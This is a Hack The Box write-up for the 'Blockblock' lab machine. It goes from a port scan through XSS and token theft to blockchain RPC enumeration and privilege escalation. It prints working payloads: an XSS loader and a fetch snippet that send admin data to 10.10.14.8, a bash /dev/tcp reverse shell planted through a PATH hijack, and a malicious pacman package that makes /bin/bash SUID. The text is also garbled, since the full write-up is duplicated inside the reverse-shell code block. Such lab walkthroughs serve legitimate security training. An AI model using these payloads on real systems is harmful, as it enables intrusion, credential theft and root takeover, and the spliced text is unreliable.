# Blockblock Writeup - Hack The Box

## Introduction

Blockblock is a challenging Hack The Box machine that tests skills in reconnaissance, web exploitation, privilege escalation, and blockchain-related vulnerabilities. This writeup outlines the steps taken to enumerate, exploit, and ultimately root the machine.

---

## Initial Reconnaissance

### Nmap Scan

The initial port scan reveals three open ports:

```bash
nmap -p- -sV -Pn 10.10.11.43 -v -sT --min-rate 5000
```

Output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
80/tcp   open  http    Werkzeug/3.0.3 Python/3.12.3
8545/tcp open  unknown
```

---

## Web Enumeration

### Registration and Exploitation

Upon accessing the web service on port 80, we register a user account and notice the option to report other users. This functionality appears vulnerable to XSS.

We create the following payload in a file named `shat.js`:

```javascript
fetch('/api/info')
  .then(response => response.text())
  .then(text => {
    fetch('http://10.10.14.8:2000/log?' + new URLSearchParams({ log: btoa(text) }), {
      mode: 'cors' // Allow cross-origin request
    });
  });
```

Next, we host the file on a Python HTTP server:

```bash
python3 -m http.server 2000
```

We embed the following XSS payload in the "Report User" field:

```html
<img src="x" onerror="var script=document.createElement('script');script.src='http://10.10.14.8:2000/shat.js';document.head.appendChild(script);">
```

When the admin processes the report, a request containing sensitive information is sent to our server. The intercepted request looks like this:

```
GET /log?log=eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6ImV5SmhiR2NpT2lKSVV6STFOaUlz...
```

### Decoding the Admin Token

We extract the Base64-encoded payload and decode it:

```bash
echo "eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6ImV5..." | base64 -d
```

Output:

```json
{"role":"admin","token":"<JWT_TOKEN>","username":"admin"}
```

We modify the session cookie with the extracted admin token, gaining access to admin-only features.

---

## Blockchain Interaction

### Intercepting Requests

Using Burp Suite, we intercept API requests made by the admin panel. We identify the following JSON-RPC call:

```json
{
  "jsonrpc": "2.0",
  "method": "eth_getBalance",
  "params": ["0x38D681F08C24b3F6A945886Ad3F98f856cc6F2f8", "latest"],
  "id": 1
}
```

To gather additional information, we craft a new request to fetch a block by number:

```json
{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0x10d4f",
    true
  ],
  "id": 1
}
```

The response contains sensitive data. Decoding the hexadecimal reveals:

```
keira//SomedayBitCoinWillCollapse
```

This is the SSH password for the user `keira`.

---

## User Access

### SSH Access

Using the credentials obtained:

```bash
ssh keira@10.10.11.43
Password: SomedayBitCoinWillCollapse
```

---

## Privilege Escalation to Paul

### Exploiting PATH Vulnerability

We observe that `keira` can execute a script under `paul`'s permissions:

```bash
sudo -u paul PATH=/tmp/rev:$PATH /home/paul/.foundry/bin/forge completions bash
```

We prepare a reverse shell payload:

```bash
We create the following payload in a file named shat.js:
fetch('/api/info')
  .then(response => response.text())
  .then(text => {
    fetch('http://10.10.14.8:2000/log?' + new URLSearchParams({ log: btoa(text) }), {
      mode: 'cors' // Allow cross-origin request
    });
  });

Next, we host the file on a Python HTTP server:
python3 -m http.server 2000

We embed the following XSS payload in the "Report User" field:
<img src="x" onerror="var script=document.createElement('script');script.src='http://10.10.14.8:2000/shat.js';document.head.appendChild(script);">

When the admin processes the report, a request containing sensitive information is sent to our server. The intercepted request looks like this:
GET /log?log=eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6ImV5SmhiR2NpT2lKSVV6STFOaUlz...
Decoding the Admin Token

We extract the Base64-encoded payload and decode it:
echo "eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6ImV5..." | base64 -d

Output:
{"role":"admin","token":"<JWT_TOKEN>","username":"admin"}

We modify the session cookie with the extracted admin token, gaining access to admin-only features.
Blockchain Interaction
Intercepting Requests

Using Burp Suite, we intercept API requests made by the admin panel. We identify the following JSON-RPC call:
{
  "jsonrpc": "2.0",
  "method": "eth_getBalance",
  "params": ["0x38D681F08C24b3F6A945886Ad3F98f856cc6F2f8", "latest"],
  "id": 1
}

To gather additional information, we craft a new request to fetch a block by number:
{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0x10d4f",
    true
  ],
  "id": 1
}

The response contains sensitive data. Decoding the hexadecimal reveals:
keira//SomedayBitCoinWillCollapse

This is the SSH password for the user keira.
User Access
SSH Access

Using the credentials obtained:
ssh keira@10.10.11.43
Password: SomedayBitCoinWillCollapse
Privilege Escalation to Paul
Exploiting PATH Vulnerability

We observe that keira can execute a script under paul's permissions:
sudo -u paul PATH=/tmp/rev:$PATH /home/paul/.foundry/bin/forge completions bash

We prepare a reverse shell payload:
mkdir -p /tmp/rev
cat > /tmp/rev/git << EOF
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
EOF
chmod +x /tmp/rev/git

Setting up a listener:
nc -nlvp <PORT>

Executing the command provides a shell as paul.
Privilege Escalation to Root
Abusing Package Installation

We create a malicious Arch Linux package to modify bash permissions:
cd /dev/shm
cat > PKGBUILD << EOF
pkgname=exp
pkgver=1.0
pkgrel=1
arch=('any')
install=exp.install
EOF

echo "post_install() { chmod 4777 /bin/bash; }" > exp.install
makepkg -s
sudo pacman -U *.zst --noconfirm

After installation, bash becomes SUID-enabled. We spawn a root shell:
bash -p
Conclusion

Blockblock tests a wide range of skills, from XSS exploitation and token manipulation to blockchain API interaction and privilege escalation using creative techniques. The journey through this machine highlights the importance of thorough enumeration and exploiting vulnerabilities at every level.

Happy hacking!


mkdir -p /tmp/rev
cat > /tmp/rev/git << EOF
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
EOF
chmod +x /tmp/rev/git
```

Setting up a listener:

```bash
nc -nlvp <PORT>
```

Executing the command provides a shell as `paul`.

---

## Privilege Escalation to Root

### Abusing Package Installation

We create a malicious Arch Linux package to modify bash permissions:

```bash
cd /dev/shm
cat > PKGBUILD << EOF
pkgname=exp
pkgver=1.0
pkgrel=1
arch=('any')
install=exp.install
EOF

echo "post_install() { chmod 4777 /bin/bash; }" > exp.install
makepkg -s
sudo pacman -U *.zst --noconfirm
```

After installation, `bash` becomes SUID-enabled. We spawn a root shell:

```bash
bash -p
```

---

## Conclusion

Blockblock tests a wide range of skills, from XSS exploitation and token manipulation to blockchain API interaction and privilege escalation using creative techniques. The journey through this machine highlights the importance of thorough enumeration and exploiting vulnerabilities at every level.

---

*Happy hacking!*
